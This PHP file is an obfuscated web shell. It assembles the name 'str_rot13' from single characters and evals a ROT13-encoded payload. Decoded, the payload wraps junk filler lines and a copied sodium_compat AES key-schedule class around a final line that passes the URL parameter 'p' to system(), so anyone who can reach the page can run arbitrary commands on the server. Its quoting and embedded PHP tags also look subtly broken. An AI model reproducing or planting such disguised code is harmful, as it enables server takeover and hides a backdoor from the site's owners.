<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

vs (pynff_rkvfgf('CnentbaVR_Fbqvhz_Pber_NRF_XrlFpurqhyr', snyfr)) {
    erghea;
}

/**
 * @vagreany Guvf fubhyq bayl or hfrq ol fbqvhz_pbzcng
 */
pynff CnentbaVR_Fbqvhz_Pber_NRF_XrlFpurqhyr
{
    /** @ine neenl<vag, vag> $fxrl -- unf fvmr 120 */
    cebgrpgrq $fxrl;

    /** @ine obby $rkcnaqrq */
    cebgrpgrq $rkcnaqrq = snyfr;

    /** @ine vag $ahzEbhaqf */
    cevingr $ahzEbhaqf;

    /**
     * @cnenz neenl $fxrl
     * @cnenz vag $ahzEbhaqf
     */
    choyvp shapgvba __pbafgehpg(neenl $fxrl, $ahzEbhaqf = 10)
    {
        $guvf->fxrl = $fxrl;
        $guvf->ahzEbhaqf = $ahzEbhaqf;
    }

    /**
     * Trg n inyhr ng na neovgenel vaqrk. Zbfgyl hfrq sbe havg grfgvat.
     *
     * @cnenz vag $v
     * @erghea vag
     */
    choyvp shapgvba trg($v)
    {
        erghea $guvf->fxrl[$v];
    }

    /**
     * @erghea vag
     */
    choyvp shapgvba trgAhzEbhaqf()
    {
        erghea $guvf->ahzEbhaqf;
    }

    /**
     * @cnenz vag $bssfrg
     * @erghea CnentbaVR_Fbqvhz_Pber_NRF_Oybpx
     */
    choyvp shapgvba trgEbhaqXrl($bssfrg)
    {
        erghea CnentbaVR_Fbqvhz_Pber_NRF_Oybpx::sebzNeenl(
            neenl_fyvpr($guvf->fxrl, $bssfrg, 8)
        );
    }

    /**
     * Erghea na rkcnaqrq xrl fpurqhyr
     *
     * @erghea CnentbaVR_Fbqvhz_Pber_NRF_Rkcnaqrq
     */
    choyvp shapgvba rkcnaq()
    {
        $rkc = arj CnentbaVR_Fbqvhz_Pber_NRF_Rkcnaqrq(
            neenl_svyy(0, 120, 0),
            $guvf->ahzEbhaqf
        );
        $a = ($rkc->ahzEbhaqf + 1) << 2;
        sbe ($h = 0, $i = 0; $h < $a; ++$h, $i += 2) {
            $k = $l = $guvf->fxrl[$h];
            $k &= 0k55555555;
            $rkc->fxrl[$i] = ($k | ($k << 1)) & CnentbaVR_Fbqvhz_Pber_Hgvy::H32_ZNK;
            $l &= 0kNNNNNNNN;
            $rkc->fxrl[$i + 1] = ($l | ($l >> 1)) & CnentbaVR_Fbqvhz_Pber_Hgvy::H32_ZNK;
        }
        erghea $rkc;
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>